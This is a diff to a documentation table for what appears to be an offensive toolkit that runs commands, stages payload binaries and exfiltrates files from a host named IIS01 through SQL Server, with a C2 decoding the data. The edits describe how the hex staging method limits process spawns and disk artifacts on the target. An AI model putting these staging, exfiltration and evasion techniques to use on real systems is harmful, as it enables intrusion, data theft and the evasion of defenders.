@@ -109,7 +109,7 @@ Must run `xpinit` first.
 | `xpshell cmd <command>` | **[DEPRECATED]** Run cmd.exe command on IIS01 via `.bat` staging (4 sqlcmd round-trips); use `xpexec` instead |
 | `xpshell psh <ps_script_content>` | **[DEPRECATED]** Stage and run PowerShell script on IIS01 via `.ps1` staging (3 sqlcmd round-trips); use `xpexec powershell -Command "..."` instead |
 | `xpstage-aes <payload_name> [--no-encrypt]` | **[DEPRECATED]** Transfer binary to IIS01 via `tempdb..stg` - AES-256-CBC encrypted, PowerShell decode on IIS01; use `xpstage-hex` instead |
-| `xpstage-hex <payload_name>` | Transfer binary to IIS01 via hex-encoded `tempdb..stg` - T-SQL ADODB.Stream decode, no process spawn on IIS01 |
+| `xpstage-hex <payload_name>` | Transfer binary to IIS01 via hex-encoded `tempdb..stg` - T-SQL ADODB.Stream decode, no process spawn on IIS01; SQL file staged on WS01 and binary written to `C:\ProgramData\` both as `.stl` (renamed to the original name via FSO MoveFile in the same decode batch) |
 | `xpexfil-aes <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]` | **[DEPRECATED]** AES-256-CBC exfiltrate file from IIS01 through `tempdb..exfil` in chunks (N×PowerShell on IIS01); use `xpexfil-hex` instead |
 | `xpexfil-hex <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]` | Hex exfil via `OPENROWSET(BULK)` + T-SQL hex INSERT - no process spawn on IIS01; C2 Python decode |
 
@@ -120,7 +120,7 @@ Must run `xpinit` first.
 | Encoding | AES-256-CBC + base64 | hex (no encryption) |
 | Decode on IIS01 | PowerShell (SqlClient loopback + AES decrypt + WriteAllBytes) | T-SQL in-process (variable concat + `CONVERT` + `sp_OA ADODB.Stream`) |
 | Process spawn on IIS01 | `cmd.exe` + `powershell.exe` | none (COM in-process in `sqlservr.exe`) |
-| Disk artifact on IIS01 | `.ps1` file (temporary) | none |
+| Disk artifact on IIS01 | `.ps1` file (temporary) | transient `<stem>.stl` (renamed in-batch) |
 | SQL file size | smaller (~1.33 chars/byte) | larger (~2 chars/byte) |
 
 Use `xpstage-hex` as the default - it eliminates process spawns and disk artifacts on the target.
